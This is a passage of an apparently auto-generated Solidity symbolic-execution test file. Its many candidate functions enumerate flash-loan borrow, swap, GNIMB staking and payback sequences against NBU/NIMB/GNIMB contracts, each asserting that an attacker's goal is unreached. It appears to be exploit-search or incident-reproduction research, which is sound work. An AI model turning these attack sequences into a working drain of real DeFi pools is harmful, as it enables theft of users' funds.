        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1450(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1451(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1452(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1453(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1454(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1455(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1456(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1457(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1458(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1459(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1460(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1461(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1462(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1463(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1464(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1465(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1466(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1467(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1468(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1469(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1470(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1471(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1472(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1473(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1474(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1475(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1476(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1477(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1478(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1479(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1480(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1481(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1482(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1483(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1484(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1485(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1486(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1487(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1488(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1489(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1490(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1491(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1492(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1493(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1494(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1495(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1496(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1497(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1498(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1499(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1500(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1501(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
